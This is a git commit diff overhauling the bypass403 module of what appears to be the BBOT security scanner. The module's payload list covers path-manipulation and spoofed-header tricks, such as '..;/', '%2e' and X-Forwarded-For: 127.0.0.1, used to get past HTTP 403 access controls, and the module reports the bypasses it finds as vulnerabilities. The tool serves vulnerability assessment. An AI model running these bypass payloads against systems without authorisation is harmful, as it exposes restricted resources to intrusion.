b4e15256dc7c43ead20fe9a1e806f8e1bf8d4e45
pmueller <paul.mueller@blacklanternsecurity.com>
2022-07-21 17:26:45 -0400

    overhaul for bypass403 module

--- bbot/modules/bypass403.py
+++ bbot/modules/bypass403.py
@@ -2,35 +2,74 @@ from bbot.modules.base import BaseModule
 from bbot.core.errors import HttpCompareError
 
 """
-Port of https://github.com/iamj0ker/bypass-403/
+Port of https://github.com/iamj0ker/bypass-403/ and https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122
 """
 
-# ([int]id,[string]method,[string]path,[dictionary]header,[bool]strip trailing slash)
+# ([string]method,[string]path,[dictionary]header,[bool]strip trailing slash)
 signatures = [
-    (1, "GET", "{scheme}://{netloc}/%2e/{path}", None, False),
-    (2, "GET", "{scheme}://{netloc}/{path}/.", None, True),
-    (3, "GET", "{scheme}://{netloc}//{path}//", None, True),
-    (4, "GET", "{scheme}://{netloc}/./{path}/./", None, True),
-    (5, "GET", "{scheme}://{netloc}/{path}", {"X-Original-URL": "{path}"}, False),
-    (6, "GET", "{scheme}://{netloc}/{path}", {"X-Custom-IP-Authorization": "127.0.0.1"}, False),
-    (7, "GET", "{scheme}://{netloc}/{path}", {"X-Forwarded-For": "http://127.0.0.1"}, False),
-    (8, "GET", "{scheme}://{netloc}/{path}", {"X-Forwarded-For": "127.0.0.1"}, False),
-    (9, "GET", "{scheme}://{netloc}/{path}", {"X-rewrite-url": "nonsense"}, False),
-    (10, "GET", "{scheme}://{netloc}/{path}%20", None, True),
-    (11, "GET", "{scheme}://{netloc}/{path}%09", None, True),
-    (12, "GET", "{scheme}://{netloc}/{path}?", None, True),
-    (13, "GET", "{scheme}://{netloc}/{path}.html", None, False),
-    (14, "GET", "{scheme}://{netloc}/{path}/?anything", None, True),
-    (15, "GET", "{scheme}://{netloc}/{path}#", None, False),
-    (16, "POST", "{scheme}://{netloc}/{path}", {"Content-Length": "0"}, False),
-    (17, "GET", "{scheme}://{netloc}/{path}/*", None, True),
-    (18, "GET", "{scheme}://{netloc}/{path}.php", None, False),
-    (19, "GET", "{scheme}://{netloc}/{path}.json", None, False),
-    (20, "GET", "{scheme}://{netloc}/{path}", {"X-Host": "127.0.0.1"}, False),
-    (21, "GET", "{scheme}://{netloc}/{path}..;/", None, False),
-    (22, "GET", "{scheme}://{netloc}/{path};/", None, False),
-    (23, "TRACE", "{scheme}://{netloc}/{path}/", None, True),
+    ("GET", "{scheme}://{netloc}/%2e/{path}", None, False),
+    ("GET", "{scheme}://{netloc}/{path}", {"X-Original-URL": "{path}"}, False),
+    ("GET", "{scheme}://{netloc}/{path}", {"X-Forwarded-For": "http://127.0.0.1"}, False),
+    ("GET", "{scheme}://{netloc}/{path}", {"X-rewrite-url": "nonsense"}, False),
+    ("GET", "{scheme}://{netloc}/{path}.html", None, False),
+    ("GET", "{scheme}://{netloc}/{path}#", None, False),
+    ("POST", "{scheme}://{netloc}/{path}", {"Content-Length": "0"}, False),
+    ("GET", "{scheme}://{netloc}/{path}.php", None, False),
+    ("GET", "{scheme}://{netloc}/{path}.json", None, False),
+    ("TRACE", "{scheme}://{netloc}/{path}/", None, True),
 ]
+
+query_payloads = [
+    "%09",
+    "%20",
+    "%23",
+    "%2e",
+    "%2f",
+    ".",
+    "?",
+    ";",
+    "..;",
+    ";%09",
+    ";%09..",
+    ";%09..;",
+    ";%2f..",
+    "*",
+    "/*",
+    "..;/",
+    ";/",
+    "/..;/",
+    "/;/",
+    "/./",
+    "//",
+    "/.",
+    "/?anything",
+]
+
+header_payloads = {
+    "Client-IP": "127.0.0.1",
+    "X-Real-Ip": "127.0.0.1",
+    "Redirect": "127.0.0.1",
+    "Referer": "127.0.0.1",
+    "X-Client-IP": "127.0.0.1",
+    "X-Custom-IP-Authorization": "127.0.0.1",
+    "X-Forwarded-By": "127.0.0.1",
+    "X-Forwarded-For": "127.0.0.1",
+    "X-Forwarded-Host": "127.0.0.1",
+    "X-Forwarded-Port": "80",
+    "X-True-IP": "127.0.0.1",
+    "X-Host": "127.0.0.1",
+}
+
+for qp in query_payloads:
+    signatures.append(
+        ("GET", "{scheme}://{netloc}/{path}%s" % qp, None, True),
+    )
+    signatures.append(
+        ("GET", "{scheme}://{netloc}/%s/{path}" % qp, None, True),
+    )
+
+for hp_key in header_payloads.keys():
+    signatures.append(("GET", "{scheme}://{netloc}/{path}", {hp_key: header_payloads[hp_key]}, False))
 
 
 class bypass403(BaseModule):
@@ -51,18 +90,24 @@ class bypass403(BaseModule):
         for sig in signatures:
 
             sig = self.format_signature(sig, event)
-            if sig[3] != None:
-                headers = sig[3]
+            if sig[2] != None:
+                headers = dict(sig[2])
             else:
                 headers = None
             match, reason, reflection, subject_response = compare_helper.compare(
-                sig[2], headers=headers, method=sig[1], allow_redirects=True
+                sig[1], headers=headers, method=sig[0], allow_redirects=True
             )
 
             if match == False:
                 if str(subject_response.status_code)[0] != "4":
+
+                    if sig[2]:
+                        added_header_tuple = next(iter(sig[2].items()))
+                        reported_signature = f"Added Header: {added_header_tuple[0]}: {added_header_tuple[1]}"
+                    else:
+                        reported_signature = f"Modified URL: {sig[1]}"
                     self.emit_event(
-                        f"403 Bypass [{event.data}] Reason: [{reason}] Sig: [{str(sig[0])}]",
+                        f"403 Bypass [{event.data}] Reason: [{reason}] Sig: [{reported_signature}]",
                         "VULNERABILITY",
                         source=event,
                         tags=["medium"],
@@ -76,14 +121,14 @@ class bypass403(BaseModule):
         return False
 
     def format_signature(self, sig, event):
-        if sig[4] == True:
+        if sig[3] == True:
             cleaned_path = event.parsed.path.strip("/")
         else:
             cleaned_path = event.parsed.path.lstrip("/")
         kwargs = {"scheme": event.parsed.scheme, "netloc": event.parsed.netloc, "path": cleaned_path}
-        formatted_url = sig[2].format(**kwargs)
-        if sig[3] != None:
-            formatted_headers = {k: v.format(**kwargs) for k, v in sig[3].items()}
+        formatted_url = sig[1].format(**kwargs)
+        if sig[2] != None:
+            formatted_headers = {k: v.format(**kwargs) for k, v in sig[2].items()}
         else:
             formatted_headers = None
-        return (sig[0], sig[1], formatted_url, formatted_headers)
+        return (sig[0], formatted_url, formatted_headers)
